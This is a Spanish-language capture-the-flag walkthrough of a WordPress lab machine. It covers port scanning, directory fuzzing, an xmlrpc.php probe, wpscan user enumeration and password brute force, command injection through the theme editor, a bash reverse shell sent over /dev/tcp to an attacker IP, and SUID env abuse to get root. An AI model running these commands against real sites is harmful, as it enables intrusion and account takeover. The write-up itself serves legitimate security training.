tags: #wpscan #facil #fuzzing #rce #reverse-shell 
_______
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- 172.17.0.2 -oN ports -n -Pn --min-rate 5000 --open
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251013114409.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p- 172.17.0.2 -oN version -n -Pn --min-rate 5000
```

![[Anexos/Pasted image 20251013114422.png]]

Ahora vamos a entrar al sitio web para averiguar de qué se trata:

![[Anexos/Pasted image 20251013114918.png]]

Vamos a aplicar fuzzing para descubrir archivos o directorios ocultos, usando el siguiente comando:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

![[Anexos/Pasted image 20251013115829.png]]

Vamos a entrar a wordpress, aunque primero quiero tener una visión un poco más global, así que vamos a hacer fuzzing al directorio wordpress para ver hasta dónde podemos llegar:

```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

Encontramos bastantes cosas:

![[Anexos/Pasted image 20251013120622.png]]

El archivo /wp-trackback.php me resulta un tanto extraño, así que decido acceder a él:

![[Anexos/Pasted image 20251013120703.png]]

Es curioso que me diga esto, pero no conseguimos nada.
Otro fallo es que podemos acceder al recurso **xmlrpc.php** lo cual es un fallo bastante grave ya que nos permite enumerar bastantes cosas.

![[Anexos/Pasted image 20251013122149.png]]

Para abusar de este archivo, vamos a utilizar una inyección de código a través del comando curl.

Primero vamos a crear un archivo llamado ataque.xml para después inyectarlo:

![[Anexos/Pasted image 20251013122706.png]]

```bash
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

![[Anexos/Pasted image 20251013123802.png]]

No vemos nada interesante, así que vamos a usar wp-scan para listar, por ejemplo, usuarios, con el siguiente comando:

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp 
```

Encontramos el usuario **mario**:

![[Anexos/Pasted image 20251013130638.png]]

Vamos a usar el siguiente comando para hacer fuerza bruta con wpscan al usuario mario:

```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

![[Anexos/Pasted image 20251013140439.png]]

Ahora, vamos a ver sus permisos:

![[Anexos/Pasted image 20251013141127.png]]

Sabiendo que es admin, vamos al editor de temas, donde se encuentra un archivo .php en el que vamos a inyectar código malicioso:

![[Pasted image 20251013143707.png]]

Encontramos este archivo, al que le ingresamos el código malicioso.
Ahora buscamos el plugin y ejecutamos el archivo en la URL con el parámetro cmd=whoami:

![[Anexos/Pasted image 20251013143803.png]]

Ahora, vamos a cambiar el código por una reverse shell a nuestra ip de atacante por el puerto 443:

**http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.20.10.4/443 0>%261"**

Hemos obtenido una reverse shell:

![[Anexos/Pasted image 20251013144558.png]]

Hago el tratamiento de la TTY, me muevo a la raíz y compruebo:

![[Anexos/Pasted image 20251013144717.png]]

Usando el siguiente comando vemos los binarios que tienen SUID:

```bash
find / -perm -4000 2>/dev/null
```

![[Anexos/Pasted image 20251013145217.png]]

Vemos que podemos abusar de la variable env, la cual buscaremos en GTFObins:

![[Anexos/Pasted image 20251013145321.png]]

Lo ejecutamos:

![[Anexos/Pasted image 20251013145816.png]]

Somos root!!